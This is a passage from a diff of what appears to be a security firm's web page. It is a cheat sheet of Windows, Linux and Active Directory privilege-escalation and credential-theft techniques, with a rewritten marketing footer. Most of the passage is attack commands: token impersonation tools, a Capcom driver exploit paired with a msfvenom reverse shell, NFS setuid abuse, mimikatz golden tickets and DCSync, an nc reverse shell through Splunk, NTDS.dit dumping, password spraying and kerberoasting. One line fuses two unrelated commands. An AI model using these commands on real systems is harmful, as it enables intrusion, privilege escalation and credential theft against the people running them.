+<p class="wp-block-paragraph">2.SharpImpersonation.exe user:&lt;user&gt; technique:ImpersonateLoggedOnuser</p>
+
+
+
+<h1 class="wp-block-heading" id="h-impersonation-token-with-seimpersonteprivilege">Impersonation Token with SeImpersontePrivilege</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Injection</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">1.execute-assembly sweetpotato.exe -p beacon.exe</p>
+
+
+
+<h1 class="wp-block-heading" id="h-impersonation-token-with-seloaddriverprivilege">Impersonation Token with SeLoadDriverPrivilege</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Injection</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">1.EOPLOADDRIVER.exe System\\CurrentControlSet\\MyService C:\\Users\\Username\\Desktop\\Driver.sys</p>
+
+
+
+<h1 class="wp-block-heading" id="h-openvpn-credentials">OpenVPN Credentials</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Enumeration &amp; Hunt</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">locate *.ovpn&nbsp;&nbsp;&nbsp;&nbsp;</p>
+
+
+
+<h1 class="wp-block-heading" id="h-bash-history">Bash History</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Enumeration &amp; Hunt</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list"><li>history&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li></ul>
+
+
+
+<p class="wp-block-paragraph">cat /home/&lt;user&gt;/.bash_history&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">cat ~/.bash_history | grep -i passw</p>
+
+
+
+<h1 class="wp-block-heading" id="h-package-capture">Package Capture</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type:&nbsp; Sniff</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">locate:&nbsp;</p>
+
+
+
+<ul class="wp-block-list"><li>tcpdump -nt -r capture.pcap -A 2&gt;/dev/null | grep -P &#8216;pwd=&#8217;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li></ul>
+
+
+
+<h1 class="wp-block-heading" id="h-nfs-root-squashing">NFS Root Squashing</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Remote Procedure Calls (RPC)</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list"><li>showmount -e &lt;victim_ip&gt;&nbsp;&nbsp;&nbsp;</li></ul>
+
+
+
+<p class="wp-block-paragraph">mkdir /tmp/mount&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">mount -o rw,vers=2 &lt;victim_ip&gt;:/tmp /tmp/mount&nbsp;&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">cd /tmp/mount</p>
+
+
+
+<p class="wp-block-paragraph">cp /bin/bash .</p>
+
+
+
+<p class="wp-block-paragraph">chmod +s bash</p>
+
+
+
+<h1 class="wp-block-heading" id="h-abusing-access-control-list">Abusing Access Control List</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type:&nbsp; Abuse Privilege</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list"><li>$user = &#8220;megacorp\jorden&#8221;</li></ul>
+
+
+
+<p class="wp-block-paragraph">$folder = &#8220;C:\Users\administrator&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">$acl = get-acl $folder</p>
+
+
+
+<p class="wp-block-paragraph">$aclpermissions = $user, &#8220;FullControl&#8221;, &#8220;ContainerInherit, ObjectInherit&#8221;, &#8220;None&#8221;, &#8220;Allow&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">$aclrule = new-object System.Security.AccessControl.FileSystemAccessRule $aclpermissions&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">$acl.AddAccessRule($aclrule)</p>
+
+
+
+<p class="wp-block-paragraph">set-acl -path $folder -AclObject $acl</p>
+
+
+
+<p class="wp-block-paragraph">get-acl $folder | folder</p>
+
+
+
+<h1 class="wp-block-heading" id="h-escalate-with-sebackupprivilege">Escalate With SeBackupPrivilege</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type:&nbsp; Abuse Privilege</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">import-module .\SeBackupPrivilegeUtils.dll</p>
+
+
+
+<p class="wp-block-paragraph">import-module .\SeBackupPrivilegeCmdLets.dll</p>
+
+
+
+<p class="wp-block-paragraph">Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit</p>
+
+
+
+<h1 class="wp-block-heading" id="h-escalate-with-seimpersonateprivilege">Escalate With SeImpersonatePrivilege</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type:&nbsp; Abuse Privilege</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
+https://github.com/dievus/printspoofer
+</div></figure>
+
+
+
+<p class="wp-block-paragraph">printspoofer.exe -i -c &#8220;powershell -c whoami&#8221;</p>
+
+
+
+<h1 class="wp-block-heading" id="h-escalate-with-seloaddriverprivilege">Escalate With SeLoadDriverPrivilege</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type:&nbsp; Abuse Privilege</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">FIRST:</p>
+
+
+
+<p class="wp-block-paragraph">Download https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys</p>
+
+
+
+<p class="wp-block-paragraph">Download https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp</p>
+
+
+
+<p class="wp-block-paragraph">Download https://github.com/tandasat/ExploitCapcom</p>
+
+
+
+<p class="wp-block-paragraph">change ExploitCapcom.cpp line 292&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">TCHAR CommandLine[] = TEXT(&#8220;C:\\Windows\\system32\\cmd.exe&#8221;);</p>
+
+
+
+<p class="wp-block-paragraph">to</p>
+
+
+
+<p class="wp-block-paragraph">TCHAR CommandLine[] = TEXT(&#8220;C:\\test\\shell.exe&#8221;);</p>
+
+
+
+<p class="wp-block-paragraph">then compile ExploitCapcom.cpp and eoploaddriver.cpp to .exe</p>
+
+
+
+<p class="wp-block-paragraph">SECOND:</p>
+
+
+
+<p class="wp-block-paragraph">1. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe &gt; shell.exe</p>
+
+
+
+<p class="wp-block-paragraph">2. .\eoploaddriver.exe System\CurrentControlSet\MyService C:\test\capcom.sys</p>
+
+
+
+<p class="wp-block-paragraph">3. .\ExploitCapcom.exe</p>
+
+
+
+<p class="wp-block-paragraph">4. in msf exec `run`</p>
+
+
+
+<h1 class="wp-block-heading" id="h-escalate-with-forcechangepassword">Escalate With ForceChangePassword</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Abuse Privilege</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+</div></figure>
+
+
+
+<p class="wp-block-paragraph">Import-Module .\PowerView_dev.ps1</p>
+
+
+
+<p class="wp-block-paragraph">Set-DomainUserPassword -Identity user1 -verbose</p>
+
+
+
+<p class="wp-block-paragraph">Enter-PSSession -ComputerName COMPUTERNAME -Credential “”</p>
+
+
+
+<h1 class="wp-block-heading" id="h-escalate-with-genericwrite">Escalate With GenericWrite</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type:&nbsp; Abuse Privilege</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">$pass = ConvertTo-SecureString &#8216;Password123#&#8217; -AsPlainText -Force</p>
+
+
+
+<p class="wp-block-paragraph">$creds = New-Object System.Management.Automation.PSCredential(&#8216;DOMAIN\MASTER USER&#8217;), $pass)</p>
+
+
+
+<p class="wp-block-paragraph">Set-DomainObject -Credential $creds USER1 -Clear serviceprincipalname</p>
+
+
+
+<p class="wp-block-paragraph">Set-DomainObject -Credential $creds -Identity USER1 -SET @{serviceprincipalname=&#8217;none/fluu&#8217;}</p>
+
+
+
+<p class="wp-block-paragraph">.\Rubeus.exe kerberoast /domain:&lt;DOMAIN&gt;</p>
+
+
+
+<h1 class="wp-block-heading" id="h-abusing-gpo">Abusing GPO</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type:&nbsp; Abuse Privilege</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">1..\SharpGPOAbuse.exe &#8211;AddComputerTask &#8211;Taskname &#8220;Update&#8221; &#8211;Author DOMAIN\&lt;USER&gt; &#8211;Command &#8220;cmd.exe&#8221; &#8211;Arguments &#8220;/c net user Administrator Password!@# /domain&#8221; &#8211;GPOName &#8220;ADDITIONAL DC CONFIGURATION&#8221;</p>
+
+
+
+<h1 class="wp-block-heading" id="h-pass-the-ticket">Pass-the-Ticket</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Abuse Ticket</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">1..\Rubeus.exe asktgt /user:&lt;USET&gt;$ /rc4:&lt;NTLM HASH&gt; /ptt</p>
+
+
+
+<p class="wp-block-paragraph">2.klist</p>
+
+
+
+<h1 class="wp-block-heading" id="h-golden-ticket">Golden Ticket</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type:&nbsp; Abuse Ticket</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">1.mimikatz # lsadump::dcsync /user:&lt;USER&gt;</p>
+
+
+
+<p class="wp-block-paragraph">2.mimikatz # kerberos::golden /user:&lt;USER&gt; /domain:&lt;/DOMAIN&gt; /sid:&lt;OBJECT SECURITY ID&gt; /rce:&lt;NTLM HASH&gt; /id:&lt;USER ID&gt;</p>
+
+
+
+<h1 class="wp-block-heading" id="h-abusing-splunk-universal-forwarder">Abusing Splunk Universal Forwarder</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux/Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type:&nbsp; Abuse Channel</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">python PySplunkWhisperer2_remote.py &#8211;lhost 10.10.10.5 &#8211;host 10.10.15.20 &#8211;username admin &#8211;password admin &#8211;payload &#8216;/bin/bash -c &#8220;rm /tmp/luci11;mkfifo /tmp/luci11;cat /tmp/luci11|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.5 5555 &gt;/tmp/luci11&#8243;&#8216;</p>
+
+
+
+<h1 class="wp-block-heading" id="h-abusing-gdbus">Abusing Gdbus</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux/Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Abuse Channel</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">gdbus call &#8211;system &#8211;dest com.ubuntu.USBCreator &#8211;object-path /com/ubuntu/USBCreator &#8211;method com.ubuntu.USBCreator.Image /home/nadav/authorized_keys /root/.ssh/authorized_keys true</p>
+
+
+
+<h1 class="wp-block-heading" id="h-abusing-trusted-dc">Abusing Trusted DC</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Abuse Channel</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ol class="wp-block-list"><li>Find user in First DC</li><li>If port 6666 enabled</li><li>proxychains evil-winrm -u user -p &#8216;pass&#8217; -i 10.100.9.253 -P 6666</li><li>. \mimikatz. exe &#8220;privilege:: debug&#8221; &#8220;sekurlsa:: logonpasswords&#8221; &#8220;token:: elevate&#8221; *lsadump:: secrets* *exit&#8221;</li><li>proxychains evil-winrm -u Administrator -p &#8216;pass dumped in step 4&#8217; -i 10.100.10.100 -P 6666</li></ol>
+
+
+
+<h1 class="wp-block-heading" id="h-ntlm-relay">NTLM Relay&nbsp;</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">responder -I eth1 -v</p>
+
+
+
+<p class="wp-block-paragraph">ntlmrelayx.py …</p>
+
+
+
+<h1 class="wp-block-heading" id="h-exchange-relay">Exchange Relay&nbsp;</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;NTLM</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">./exchangeRelayx.py …</p>
+
+
+
+<h1 class="wp-block-heading" id="h-dumping-with-diskshadow">Dumping with diskshadow</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Dumping</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">1. priv.txt contain</p>
+
+
+
+<p class="wp-block-paragraph">SET CONTEXT PERSISTENT NOWRITERSp</p>
+
+
+
+<p class="wp-block-paragraph">add volume c: alias 0xprashantp</p>
+
+
+
+<p class="wp-block-paragraph">createp</p>
+
+
+
+<p class="wp-block-paragraph">expose %0xprashant% z:p</p>
+
+
+
+<p class="wp-block-paragraph">2. exec with diskshadow /s priv.txt</p>
+
+
+
+<h1 class="wp-block-heading" id="h-dumping-with-vssadmin">Dumping with vssadmin</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Dumping</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">vssadmin create shadow /for=C:</p>
+
+
+
+<p class="wp-block-paragraph">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy</p>
+
+
+
+<p class="wp-block-paragraph">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy./kerbrute_linux_amd64 passwordspray -d domain.local &#8211;dc 10.10.10.10 domain_users.txt Password123</p>
+
+
+
+<h1 class="wp-block-heading" id="h-password-spraying">Password Spraying</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Spraying</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">./kerbrute_linux_amd64 passwordspray -d domain.local &#8211;dc 10.10.10.10 domain_users.txt Password123</p>
+
+
+
+<h1 class="wp-block-heading" id="h-as-rep-roasting">AS-REP Roasting</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Kerberos</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">.\Rubeus.exe asreproast</p>
+
+
+
+<h1 class="wp-block-heading" id="h-kerberoasting">Kerberoasting</h1>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Kerberos</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request</p>
+
+
+
+<p class="wp-block-paragraph">crackmapexec ldap 10.0.2.11 -u &#8216;username&#8217; -p &#8216;password&#8217; &#8211;kdcHost 10.0.2.11 &#8211;kerberoast output.txt</p>
     </div>
 
     <!-- ═══ CAREER PLATFORM CTA ═══ -->
@@ -1609,27 +3242,27 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
 
         <!-- Headline -->
         <h3 style="font-family:var(--font-display);font-size:24px;font-weight:800;color:#fff;margin:0 0 8px;line-height:1.3">
-          Ready to Accelerate Your Cybersecurity Career?
+          Put this research to work on your environment
         </h3>
         <p style="font-size:15px;color:rgba(255,255,255,0.55);line-height:1.7;max-width:520px;margin:0 auto 28px">
-          Access structured learning paths, hands-on skill labs, and expert coaching — everything you need to land your next role.
+          The team behind this article runs attack surface management, SAST, red team operations and vulnerability research for organizations that need answers, not checklists.
         </p>
 
         <!-- Buttons -->
         <div style="display:flex;align-items:center;justify-content:center;gap:14px;flex-wrap:wrap">
-          <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
+          <a href="/products/" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M13.8 12H3" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Start Free
+            Explore Services
           </a>
-          <a href="https://career.hadess.io/games/" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
+          <a href="/products/#contact" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" stroke-linecap="round" stroke-linejoin="round"/><path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Hack &amp; Learn Games
+            Talk to an Expert
           </a>
         </div>
 
         <!-- Subtle trust line -->
         <p style="font-size:12px;color:rgba(255,255,255,0.3);margin:20px 0 0;letter-spacing:0.3px">
-          100% free to start &middot; No credit card required &middot; 80+ skill modules
+          ASM &middot; SAST &middot; Red Team &middot; Vulnerability Research &middot; Career
         </p>
       </div>
     </div>
@@ -1764,11 +3397,11 @@ function showCopied(){
 <div style="max-width:var(--max-w);margin:0 auto;padding:0 32px 80px">
   <div style="background:linear-gradient(135deg,rgba(250,204,21,0.08),rgba(245,158,11,0.03));border:1px solid var(--gold-border);border-radius:20px;padding:60px;text-align:center;position:relative;overflow:hidden">
     <div style="content:'';position:absolute;top:-100px;right:-100px;width:300px;height:300px;background:radial-gradient(circle,rgba(250,204,21,0.1),transparent 70%);pointer-events:none"></div>
-    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Ready to Accelerate Your Cybersecurity Career?</h2>
-    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Structured paths, expert coaching, and hands-on skill development — all in one platform.</p>
-    <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
+    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Know your exposure before attackers do.</h2>
+    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Attack surface management, SAST, red team operations and vulnerability research — from the team behind HADESS research.</p>
+    <a href="/products/" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
       <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Explore Products &amp; Services
     </a>
   </div>
 </div>
@@ -1791,59 +3424,38 @@ function showCopied(){
           </div>
           <div style="display:flex;align-items:center;gap:10px;font-size:13px;color:var(--text-muted)">
             <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="color:var(--gold);flex-shrink:0"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg>
-            career@hadess.io
+            security@hadess.io
           </div>
         </div>
         <div style="display:flex;gap:12px">
           <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
           <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
